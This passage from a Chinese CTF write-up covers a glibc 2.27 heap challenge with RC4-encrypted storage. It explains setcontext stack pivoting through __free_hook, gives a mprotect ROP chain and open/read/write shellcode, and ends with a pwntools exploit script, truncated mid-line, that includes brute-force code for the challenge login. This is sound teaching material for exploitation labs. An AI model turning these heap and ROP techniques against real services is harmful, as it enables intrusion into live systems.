&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序还有一个点是加密，这是一个用了密钥的对称加密。对常见的加密算法不是很熟所以当时放弃了，其实这是一个rc4。</p><blockquote><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。由于异或运算的对合性，RC4加密解密使用同一套算法。</p></blockquote><p>下面就是一个典型的rc4加密算法初始化的过程，一般初始化要包含三个参数：Sbox数组，密钥，密钥的长度。</p><ol><li class="lvl-3"><p>初始化存储0-255字节的Sbox(其实就是一个数组)</p></li><li class="lvl-3"><p>填充key到256个字节数组中称为Tbox(你输入的key不满256个字节则初始化到256个字节)</p></li><li class="lvl-3"><p>交换s[i]与s[j] i 从0开始一直到255下标结束. j是 s[i]与T[i]组合得出的下标。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *key, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-119h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE v8[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = key[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = ((<span class="type">char</span>)v8[j] + v7 + (<span class="type">unsigned</span> __int8)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v7];</span><br><span class="line">    a1[v7] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化s盒后就是加密了。加密同样接受三个参数：初始化好的sbox，待加密的明文，以及明文长度。</p><p>RC4加密其实就是遍历数据,将数据与sbox进行异或加密,而在此之前还需要交换一次sbox的数据交换完之后 再把s[i] + s[j]的组合当做下标再去异或.下面是本题中的加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> __int8)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> __int8)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序在读写的时候都会调用这套加密，创建chunk的时候会将输入加密后存储，read的时候会先解密读完再加密写回去，free则是会先解密再free（还算有点良心？）。</p><h1>攻击思路（重要）</h1><p>glibc2.27的noexecve的简单沙箱，我们肯定是setcontext栈迁移了，2.27还不用FSOP，直接用hook就行。</p><h2 id="什么是setcontext？">什么是setcontext？</h2><p>这是一个glibc库中的函数，用于恢复上下文。询问ai给出的答案是，这个函数一是可以用于在用户态实现线程和协程，二是作为POSIX标准的残留接口保留了下来。</p><p>这个函数牛逼在什么地方呢，它既然是涉及到切换上下文，那么肯定是对大量的寄存器赋值。这个函数中有<code>mov rsp,xxx</code>这样的gadget，我们可以利用这个东西在用户态劫持栈，实现<br>stack pivot。这种攻击方式在沙箱heap中非常常见，如果我们能劫持一次控制流，就总能想办法用这个gadget实现栈迁移最后ROP。</p><p>在glibc较低的版本中，非常好的地方是，这个函数对rsp赋值还是基于rdi的。以本题为例，<code>setcontext+53</code>的地方存放的是这样的一条指令：<code>mov rsp, [rdi+0xa0]</code>。rdi是我们喜闻乐见的，好控制的寄存器，因此这个很好用。如果我们函数第一参数是一个可控的指针，那就任意栈迁移了，于是可以结合free_hook去利用。</p><p>另外，在较高的版本中比如glibc2.35，这个函数不再依据rdi赋值，而是变成了rdx（偏移也变成了setcontext+61）。这让我们的利用难度有所增加但是不多，因为我们能找到交换rdx和rdi的gadget。以glibc2.35为例，就在0x167420这么一个gadget：<code>0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>, 将<code>rdi+8</code>指向的内容赋值给rdx，将rax写入栈顶，然后跳到<code>rdx+0x20</code>指向的位置执行。这样我们就能间接地实现将rdi和rdx关联起来，利用rdi给rdx赋值然后再setcontext</p><p>最后setcontext这段函数在给rsp赋值后，会<code>mov rcx,[rdi+0xa8]</code>然后<code>push rcx</code>最后ret，因此我们在fakestack地址+0x8的位置就可以写入我们接下来要执行的内容。好用</p><blockquote><p>另外，基于上下文切换还存在一种叫做“SROP”的攻击方法，是利用信号中断等方式，通过在栈上伪造上下文达成控制流劫持，和我们用setcontexgt的gadget有点点类似</p></blockquote><h2 id="回到题目…">回到题目…</h2><p>因此，在低版本还有hook的时候，我们对于沙箱heap题的思路就是free_hook+setcontext栈迁移rop。rop有两种思路，一种是纯rop去libc中找orw，另一种是写shellcode，然后用mprotect先把heap可执行。由于第一次接触时看的exp采用后者，下面笔者也使用后者的方法。</p><p>对于开了沙箱的题目，首先应该动调到我们能够手动控制分配的地方，观察堆的排布，从而确定我们接下来分配的size和堆风水需求，一般tcache和smallbin会比较乱，一般会挑一个size通过取和放将tcache填满后进行我们后续的工作。</p><p>对本题来说具体的攻击步骤如下：</p><ol><li class="lvl-3"><p>简单堆风水，然后用unsortedbin泄露libc，用tcache泄露堆地址</p></li><li class="lvl-3"><p>准备工作，先在一个chunk1中布局我们的fakestack（具体内容见后续）</p></li><li class="lvl-3"><p>然后在另一个chunk2里填充0xa0垃圾数据后，在0xa0偏移写入fakestack的栈顶（chunk1对应位置），然后在0xa8写入ret的gadget地址</p></li><li class="lvl-3"><p>任意地址分配chunk分配到freehook处，在freehook写入setcontext+53的地址</p></li><li class="lvl-3"><p>最后free掉chunk2，触发</p></li></ol><p>此时经历了下述流程：<br>free_hook(rdi=chunk2_addr)<br>-&gt;(mov rsp,[rdi+0xa0]，此时rsp内是chunk1_addr，栈已经被换)<br>-&gt;(mov rcx,[rdi+0xa8];push rcx，此时栈顶是一个ret的地址)<br>-&gt;ret两次，第二次ret就启动了我们fakestack上的rop链</p><h2 id="一些板子">一些板子</h2><p>关于fakestack的布置，这里写一个板子，因为我们首先要调用mprotect，因此要这么布置（开始可以填很多ret无所谓的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p64(ret)</span><br><span class="line">+p64(pop_rdi)</span><br><span class="line">+p64(heap_base)</span><br><span class="line">+p64(pop_rsi)</span><br><span class="line">+p64(<span class="number">0x7000</span>)（size，无所谓，大点也好）</span><br><span class="line">+p64(pop_rdx)</span><br><span class="line">+p64(<span class="number">0x7</span>)</span><br><span class="line">+p64(mprotect)（直接libc.sym就行）</span><br><span class="line">+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)（指向shellcode，也就是下一行的起始地址就行）</span><br><span class="line">+asm(shellcode)（orw）</span><br></pre></td></tr></table></figure><p>然后shellcode如下，buffer随便写一个能读写的地址就行，heap+0x3000这种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1>总结</h1><p>最简单的沙箱堆，但是也花了小半天来复现。更高的版本也无非就是用fsop的链子，那一次的控制流劫持换到其他点然后后续还是一样的。或者是先跳到magic_gadget，就是麻烦了点。</p><h1>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p=remote(&quot;0192d66238177833936ff330dfec8bbd.huj5.dg04.ciihw.cn&quot;,43631)</span></span><br><span class="line"><span class="comment"># charset = &quot;\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 爆破用户名</span></span><br><span class="line"><span class="comment"># def crack_username():</span></span><br><span class="line"><span class="comment">#     username = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1, 128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=username + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid username!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid username length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Username correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(username)</span></span><br><span class="line"><span class="comment">#                 return username</span></span><br><span class="line"><span class="comment"># # 4dm1n</span></span><br><span class="line"><span class="comment"># def crack_password():</span></span><br><span class="line"><span class="comment">#     password=b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1,128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=password + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, b&#x27;4dm1n&#x27;)</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your password:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid password!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid password length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Password correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 return password</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(crack_username())</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=elf.process()</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;The result is:\n\t[key,value] = &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">    value=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(value)</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size取决于我们创建时的输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;s4cur1ty_p4ssw0rd&#x27;</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="comment"># s4cur1ty_p4ssw0rd</span></span><br><span class="line"><span class="comment"># glibc 2.27 heap 沙箱no execve</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, <span class="string">b&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0-6 填入tcache，7进unsorted,加一个8分割</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,(<span class="number">0x290</span>),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x290</span>)</span><br><span class="line">    <span class="comment">#print(f&quot;alloc &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    <span class="comment">#print(f&quot;delete &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">leak_addr=show(<span class="number">7</span>)<span class="comment"># delete会还原内容，而泄露会再过一遍rc4</span></span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">main_arena_addr=leak_addr-<span class="number">96</span></span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x3ebca0</span>+<span class="number">0x60</span></span><br><span class="line">libc.address=libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次重新初始化，这是个流密码不然会继续，草</span></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">leak_addr=show(<span class="number">1</span>)</span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line"><span class="built_in">print</span>(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">heap_base=leak_addr-<span class="number">0x1670</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] heap_base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunks : $rebase(0x203080)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># malloc_hook=libc_base + 0x3ebc30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] free_hook: &quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">gadget=libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line"><span class="comment"># open_addr=libc.symbols[&#x27;open&#x27;]</span></span><br><span class="line"><span class="comment"># read_addr=libc.symbols[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># write_addr=libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;[+] orw: &quot;,hex(open_addr),hex(read_addr),hex(write_addr))</span></span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 把tcache里开始的0x50拿出来</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">payload1=p64(free_hook)</span><br><span class="line">payload1=cipher.encrypt(payload1)</span><br><span class="line">edit(<span class="number">9</span>,payload1)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 下一个是freehook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_stack=heap_base+0x1670</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2164f</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x23a6a</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line">buffer=heap_base+<span class="number">0x3000</span> <span class="comment"># 随便写的</span></span><br><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(ret)+p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x7000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(mprotect)+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)+asm(shellcode)</span><br><span class="line"><span class="comment"># fake_stack=b&#x27;\x00&#x27;*0x10</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(heap_base+0x24c8)+p64(pop_rsi)+p64(0)+p64(libc_base+0x10fbf0)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x40)+p64(libc_base+0x110020)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(1)+p64(libc_base+0x1100f0)</span></span><br><span class="line"><span class="comment"># fake_stack+=b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmd有点看运气，地址随机里面有0a就gg</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b free&#x27;</span>)</span><br><span class="line"><span class="comment"># free1 将栈迁移到0上</span></span><br><span class="line"><span class="comment"># 还有一个问题就是迁移时候的指令状态</span></span><br><span class="line">payload2=<span class="string">b&#x27;z&#x27;</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x10</span>)+p64(ret)</span><br><span class="line"><span class="comment"># 读到0xa会断，所以free掉让它变明文？？？</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">1</span>,payload2)<span class="comment">#这个能通</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">0</span>,shellcode)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">add(<span 